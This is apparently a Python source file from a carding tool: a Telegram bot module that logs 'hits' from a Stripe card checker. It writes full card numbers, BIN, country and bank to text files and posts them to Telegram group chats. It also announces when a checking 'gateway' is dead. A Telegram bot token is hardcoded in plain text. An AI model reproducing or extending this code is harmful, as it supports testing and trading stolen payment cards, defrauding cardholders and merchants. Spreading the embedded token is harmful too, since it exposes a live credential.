import telebot

token = "6535718693:AAFYOw057HWOOmFFZp--uf0POO5-Gxvou2g"
bot = telebot.TeleBot(token, parse_mode="HTML")


def hit(amt, cc, ii, do, bank, emj, gate, key, username):
    
    name = "hit.txt"
    with open(name, "a") as f:
          f.write(f'''
╔══════════════════════════╗
║  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 {amt}
║  𝗦𝗧𝗔𝗧𝗨𝗦 ➜  {key}
║  𝑪𝑪 ➜ {cc}                       
║  𝑩𝑰𝑵 ➜ {ii}                      
║  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}              
║  𝑩𝑨𝑵𝑲 ➜ {bank}
║  Flag ➜ {emj}
║  Gatet ➜ {gate}
╚══════════════════════════╝
Hit 𝗯𝘆: {username}
𝗕𝗼𝘁 𝗯𝘆: @𝘄𝗼𝗿𝗱2048
''')
    msg1 = f'''
╔══════════════════════════╗
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 {amt}</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {key}</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Gatet ➜ {gate}</b>
╚══════════════════════════╝
Hit 𝗯𝘆: <b><code>{username}</code></b>
𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
 
    id = -1001920980376     
    bot.send_message(chat_id=id, text=msg1, parse_mode='HTML')
def insufficient(amt, cc, ii, do, bank, emj, gate, key, username):
    
    name = "insufficient.txt"
    with open(name, "a") as f:
          f.write(f'''
╔══════════════════════════╗
║  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 {amt}
║  𝗦𝗧𝗔𝗧𝗨𝗦 ➜  {key}
║  𝑪𝑪 ➜ {cc}                       
║  𝑩𝑰𝑵 ➜ {ii}                      
║  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}              
║  𝑩𝑨𝑵𝑲 ➜ {bank}
║  Flag ➜ {emj}
║  Gatet ➜ {gate}
╚══════════════════════════╝
Hit 𝗯𝘆: {username}
𝗕𝗼𝘁 𝗯𝘆: @𝘄𝗼𝗿𝗱2048
''')



def die(gate, username):
     msg = f'''
     <b>Gatet is Dead ➜ {gate}</b>
From: <b><code>{username}</code></b>
𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
     id = -1002062360461     
     bot.send_message(chat_id=id, text=msg, parse_mode='HTML')
     